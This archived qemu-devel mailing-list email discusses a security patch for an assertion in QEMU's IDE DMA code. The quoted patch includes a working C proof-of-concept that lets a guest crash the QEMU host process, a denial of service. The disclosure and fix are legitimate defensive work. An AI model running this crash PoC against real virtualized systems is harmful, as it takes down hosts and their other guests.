Return-Path: <SRS0=EylP=Y6=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-6.8 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
	INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS
	autolearn=ham autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 37D99C5DF62
	for <qemu-devel@archiver.kernel.org>; Wed,  6 Nov 2019 12:09:56 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 01DEA214D8
	for <qemu-devel@archiver.kernel.org>; Wed,  6 Nov 2019 12:09:56 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 01DEA214D8
Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=redhat.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:56974 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1iSK8J-0006xk-1U
	for qemu-devel@archiver.kernel.org; Wed, 06 Nov 2019 07:09:55 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:49624)
 by lists.gnu.org with esmtp (Exim 4.90_1)
 (envelope-from <mst@redhat.com>) id 1iSK7Y-0006Mb-FY
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 07:09:09 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <mst@redhat.com>) id 1iSK7T-0004B8-7b
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 07:09:08 -0500
Received: from mx1.redhat.com ([209.132.183.28]:56000)
 by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
 (Exim 4.71) (envelope-from <mst@redhat.com>) id 1iSK7S-0004Al-VP
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 07:09:03 -0500
Received: from mail-qk1-f200.google.com (mail-qk1-f200.google.com
 [209.85.222.200])
 (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 (No client certificate requested)
 by mx1.redhat.com (Postfix) with ESMTPS id 1C8F03688E
 for <qemu-devel@nongnu.org>; Wed,  6 Nov 2019 12:09:02 +0000 (UTC)
Received: by mail-qk1-f200.google.com with SMTP id a13so24495508qkc.17
 for <qemu-devel@nongnu.org>; Wed, 06 Nov 2019 04:09:02 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20161025;
 h=x-gm-message-state:date:from:to:cc:subject:message-id:references
 :mime-version:content-disposition:in-reply-to;
 bh=NSUGRbN07qF8QVDKv/I16ptdRkvQljL4bI9AfD5Wjyo=;
 b=JRzW3CsiHQdi+fnDGu8JcxhskOxnll9bfx5PxOgMqqJsO1Y4Tkr6fjBY53ZUy9qyMB
 mOctquH1yd0w2YOX0sOPxorxYmzmOY9zgJaz+v9BAUnCv/gDhwuCDCL91iTpDQkYnmqx
 7/KFxvPrThdgmsJ1B7pIzXzHZBAhUmEM5AnT2yV/MOVNuKAEh+bzIIXSra+oH0dk7PXT
 7iMffluLU5LvLNaXBpDnrfGPTZSW2sTXfTp/O4iTUk+gdkETcag3dyvXJ7kbdw0mROFX
 cRfnUVgMBRu7cG7cawQzwjl8qrM4THpNj2jtXkBedgSDeC+xBoulGFECXOzu/QtGkED0
 D0lg==
X-Gm-Message-State: APjAAAVmnJx4MiVMB+A+o1B7qjd6S+yNdjCQGL43IJGvSCIa+gnnecrd
 4rZxaHBGcK/9v9cGLBB52EhkVFgRyV6hKkZtxFifA/HB/nBsxZG4Z1BU664uiugIAbNiD72v0sU
 ofHS4+0tUJAQF2YI=
X-Received: by 2002:ad4:55ce:: with SMTP id bt14mr1812198qvb.131.1573042141364; 
 Wed, 06 Nov 2019 04:09:01 -0800 (PST)
X-Google-Smtp-Source: APXvYqx6px298bkLUgvZqHDXCxGbHptgNHSqO9f83kkfBHh0eRCowJIxM4KBitanoRAFY3/2af8b0A==
X-Received: by 2002:ad4:55ce:: with SMTP id bt14mr1812180qvb.131.1573042141074; 
 Wed, 06 Nov 2019 04:09:01 -0800 (PST)
Received: from redhat.com (bzq-79-178-12-128.red.bezeqint.net. [79.178.12.128])
 by smtp.gmail.com with ESMTPSA id e11sm9963859qtj.29.2019.11.06.04.08.57
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Wed, 06 Nov 2019 04:09:00 -0800 (PST)
Date: Wed, 6 Nov 2019 07:08:54 -0500
From: "Michael S. Tsirkin" <mst@redhat.com>
To: Alexander Popov <alex.popov@linux.com>
Subject: Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent
 qemu DoS from quest
Message-ID: <20191106070530-mutt-send-email-mst@kernel.org>
References: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
 <d748c840-56b7-6dcd-c82d-fea0a4949e8d@linux.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <d748c840-56b7-6dcd-c82d-fea0a4949e8d@linux.com>
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 [fuzzy]
X-Received-From: 209.132.183.28
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Cc: Andrea Arcangeli <aarcange@redhat.com>, sstabellini@kernel.org,
 pmatouse@redhat.com, mdroth@linux.vnet.ibm.com, qemu-block@nongnu.org,
 qemu-devel@nongnu.org, qemu-stable@nongnu.org,
 Kashyap Chamarthy <kashyap.cv@gmail.com>, Paolo Bonzini <pbonzini@redhat.com>,
 John Snow <jsnow@redhat.com>, pjp@redhat.com,
 David Woodhouse <David.Woodhouse@intel.com>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

On Wed, Nov 06, 2019 at 01:17:51PM +0300, Alexander Popov wrote:
> On 27.07.2019 00:09, Alexander Popov wrote:
> > On 26.07.2019 2:25:03 GMT+02:00, John Snow <jsnow@redhat.com> wrote:
> >> Oh, this is fun.
> > ...
> >> I can worry about a proper fix for 4.2+.
> >
> > Hello John,
> >
> > Thanks for your letter.
> >
> > I double-checked the git history and mailing list, I'm still sure
> > that my fix for this assertion is correct.
> 
> Hello!
> 
> I'm pointing politely to this issue again.
> 
> It crashes qemu during syzkaller fuzzing.
> 
> It's really annoying to manually apply the fix against it to qemu.

I understand. Maybe the fuzzer can be taught to skip the
specific issue for now?

> I'm quoting my patch from July that _correctly_ fixes the wrong assertion
> introduced in the commit a718978ed58a.
> 
> Why don't you apply my commit and then do the refactoring later when you want?
> 
> Best regards,
> Alexander
> 
> On 05.07.2019 17:07, Alexander Popov wrote:
> > This assertion was introduced in the commit a718978ed58a in July 2015.
> > It implies that the size of successful DMA transfers handled in
> > ide_dma_cb() should be multiple of 512 (the size of a sector).
> > 
> > But guest systems can initiate DMA transfers that don't fit this
> > requirement. Let's improve the assertion to prevent qemu DoS from quests.
> > 
> > PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
> > command and crash qemu:
> > 
> > #include <stdio.h>
> > #include <sys/ioctl.h>
> > #include <stdint.h>
> > #include <sys/types.h>
> > #include <sys/stat.h>
> > #include <fcntl.h>
> > #include <string.h>
> > #include <stdlib.h>
> > #include <scsi/scsi.h>
> > #include <scsi/scsi_ioctl.h>
> > 
> > #define CMD_SIZE 2048
> > 
> > struct scsi_ioctl_cmd_6 {
> > 	unsigned int inlen;
> > 	unsigned int outlen;
> > 	unsigned char cmd[6];
> > 	unsigned char data[];
> > };
> > 
> > int main(void)
> > {
> > 	intptr_t fd = 0;
> > 	struct scsi_ioctl_cmd_6 *cmd = NULL;
> > 
> > 	cmd = malloc(CMD_SIZE);
> > 	if (!cmd) {
> > 		perror("[-] malloc");
> > 		return 1;
> > 	}
> > 
> > 	memset(cmd, 0, CMD_SIZE);
> > 	cmd->inlen = 1337;
> > 	cmd->cmd[0] = READ_6;
> > 
> > 	fd = open("/dev/sg0", O_RDONLY);
> > 	if (fd == -1) {
> > 		perror("[-] opening sg");
> > 		return 1;
> > 	}
> > 
> > 	printf("[+] sg0 is opened\n");
> > 
> > 	printf("[.] qemu should break here:\n");
> > 	fflush(stdout);
> > 	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
> > 	printf("[-] qemu didn't break\n");
> > 
> > 	free(cmd);
> > 
> > 	return 1;
> > }
> > 
> > Signed-off-by: Alexander Popov <alex.popov@linux.com>
> > ---
> >  hw/ide/core.c | 2 +-
> >  1 file changed, 1 insertion(+), 1 deletion(-)
> > 
> > diff --git a/hw/ide/core.c b/hw/ide/core.c
> > index 6afadf8..304fe69 100644
> > --- a/hw/ide/core.c
> > +++ b/hw/ide/core.c
> > @@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
> >  
> >      sector_num = ide_get_sector(s);
> >      if (n > 0) {
> > -        assert(n * 512 == s->sg.size);
> > +        assert(n == s->sg.size / 512);
> >          dma_buf_commit(s, s->sg.size);
> >          sector_num += n;
> >          ide_set_sector(s, sector_num);

